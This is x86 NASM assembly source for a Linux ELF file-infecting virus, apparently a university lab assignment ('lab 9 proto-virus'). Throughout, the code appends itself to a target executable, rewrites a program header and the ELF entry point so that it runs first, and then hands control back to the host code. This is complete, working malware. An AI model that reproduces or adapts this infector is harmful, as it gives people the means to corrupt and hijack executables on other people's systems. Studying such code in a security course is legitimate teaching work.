%macro	syscall1 2
	mov	ebx, %2
	mov	eax, %1
	int	0x80
%endmacro

%macro	syscall3 4
	mov	edx, %4
	mov	ecx, %3
	mov	ebx, %2
	mov	eax, %1
	int	0x80
%endmacro

%macro  exit 1
	syscall1 1, %1
%endmacro

%macro  write 3
	syscall3 4, %1, %2, %3
%endmacro

%macro  read 3
	syscall3 3, %1, %2, %3
%endmacro

%macro  open 3
	syscall3 5, %1, %2, %3
%endmacro

%macro  lseek 3
	syscall3 19, %1, %2, %3
%endmacro

%macro  close 1
	syscall1 6, %1
%endmacro

%define	STK_RES	200
%define	RDWR	2
%define	SEEK_END 2
%define SEEK_CUR 1
%define SEEK_SET 0
%define STDOUT 1
%define ENTRY		24
%define PHDR_start	28
%define	PHDR_size	32
%define PHDR_memsize	20	
%define PHDR_filesize	16
%define	PHDR_offset	4
%define	PHDR_vaddr	8
%define HEADER_SIZE 52
%define PH_OFFSET 0x1c
%define LOAD_STARTING_LOCATION 0x08048000

	global _start

	section .text
my_start:
get_my_loc:
	call anchor	
anchor:
	pop edx ; edx holds the current address
	mov dword [ebp-4],edx
	ret
; EBP-4 => get my loc
; EBP-8 => File descriptor
; EBP -12 => size of the file
; EBP -16 => virus entry point
; EBP -20 => old entry point
; EBP -24 => new ep
; EBP -28 => ph offset value
; EBP -32 => first vaddr oh ph1
; EBP -36 => second vaddr on ph2
_start:	push	ebp
	mov	ebp, esp
	sub	esp, STK_RES            ; Set up ebp and reserve space on the stack for local storage
	call get_my_loc ; ebp-4 and edx holds the current location
	add dword [ebp-4], (OutStr-anchor)
	write STDOUT,dword [ebp-4],31
	call get_my_loc
	add dword [ebp-4],(FileName-anchor) 
	open dword [ebp-4],RDWR,0
	mov dword [ebp-8],eax ; ebp-8 holds the file descriptor
	cmp byte [ebp-8],0
	jl .error1
	.checking_elf:
	mov ecx, ebp
	sub ecx,200
	read dword [ebp-8],	ecx,4
	cmp byte [ecx],0x7F
	jne .error2
	cmp byte [ecx+1],'E'
	jne .error2
	cmp byte [ecx+2],'L'
	jne .error2
	cmp byte [ecx+3],'F'
	jne .error2
	.planting_virus:
		lseek dword [ebp-8],0,SEEK_END
		mov dword [ebp-12],eax ; ebp -12 holds number of bytes read - the size of the file
		call get_my_loc
		add dword [ebp-4], (my_start-anchor)
		write dword [ebp-8],dword [ebp-4],(virus_end-my_start)
		jmp .load_header
	.error1:
		call get_my_loc
		add dword[ebp-4],(Failstr1-anchor)
		write STDOUT,dword [ebp-4],19
		exit 1
	.error2:
		call get_my_loc
		add dword [ebp-4],(Failstr2-anchor)
		write STDOUT,dword [ebp-4],18
		exit 2
	.load_header:
	lseek dword [ebp-8],0,SEEK_SET ; changing to the beginning of the file
	mov ecx,ebp
	sub ecx,200
	read dword [ebp-8],ecx,52 ; now ebp-200 holds the elf_header. ecx+24 holds the entry point!!
	mov eax,dword [ecx+24]
	mov dword [ebp-20],eax ; NOW EBP-20 == old entry point

	.load_phs:
	mov ecx,ebp
	sub ecx,200
	mov ebx, dword [ecx+PHDR_start]
	mov dword [ebp-28],ebx ; save the ph offset value in the header. EBP-28 = PH OFFSET VALUE
	lseek dword [ebp-8],dword [ebp-28],SEEK_SET
	mov ecx,ebp
	sub ecx,200 ; begining
	add ecx,HEADER_SIZE
	read dword [ebp-8],ecx,PHDR_size
	add ecx,PHDR_size
	read dword [ebp-8],ecx,PHDR_size
	mov ecx,ebp
	sub ecx,200
	add ecx,HEADER_SIZE
	mov eax, dword [ecx+PHDR_vaddr]
	add ecx,PHDR_size
	mov ebx, dword [ecx+PHDR_vaddr]
	mov dword [ebp-32],eax ; save vaddr1
	sub ebx,dword [ecx+PHDR_offset]
	mov dword [ebp-36],ebx ; save vaddr2


modify_ph:
	mov ecx,ebp
	sub ecx,200
	add ecx,HEADER_SIZE
	add ecx,PHDR_size ; Ecx holds the addr of the second hdr in size
	mov dword [ebp-40],ecx ; save the location of the second phdr
	mov eax, dword [ebp-12]; ph size
	sub eax,dword [ecx+PHDR_offset] ; finish their calculation .EAX holds the new filesize and memsize
	add eax, virus_end-my_start ; virus code length
	mov dword [ecx+PHDR_filesize],eax
	mov dword [ecx+PHDR_memsize],eax
	lseek dword [ebp-8],dword [ebp-28],SEEK_SET
	lseek dword [ebp-8],PHDR_size,SEEK_CUR
	write dword [ebp-8],dword [ebp-40],PHDR_size

	.change_header:
	mov eax, dword [ebp-12] ; saves amount of bytes read = filesize
	add eax, dword [ebp-36] ; EBP-36 the vaddr2-offset
	mov dword [ebp-16],eax ; now ebp-16 holds the starting virtual location of the virus loaded
	; mov eax, dword [ebp-16] ;save the value in eax
	add eax,_start-my_start ; add to be the start to be ran. new entry point
	mov dword [ebp-24],eax ; save new ep
	mov ecx,ebp
	sub ecx,200
	mov dword [ecx+ENTRY],eax ;change the header
	lseek dword [ebp-8],0,SEEK_SET ; changing to the beginning of the file
	mov ecx,ebp
	sub ecx,200
	write dword [ebp-8],ecx,52 ; writing the new header
	.return_to_prev:
	lseek dword [ebp-8],-4,SEEK_END ; will point to the 4 last bytes == the data of the prev entry point
	mov ecx, ebp
	sub ecx,20 ; ecx holds the ptr to the previous entry point
	write dword [ebp-8],ecx,4 ; change previous entry point in the file
	close dword [ebp-8] ;closing the file
	call get_my_loc
	add dword [ebp-4],(PreviousEntryPoint-anchor)
	mov eax, dword [ebp-4]
	mov ebx, [eax] ; get the data of the prev entry
	jmp ebx
VirusExit:
       exit 0            ; Termination if all is OK and no previous code to jump to
                         ; (also an example for use of above macros
FileName:	db "ELFexec", 0
hello: db "This is a virus",10,0
OutStr:		db "The lab 9 proto-virus strikes!", 10, 0
Failstr1:        db "error in openning", 10 , 0
Failstr2:	db "error not an elf",10,0
PreviousEntryPoint: dd VirusExit
virus_end:


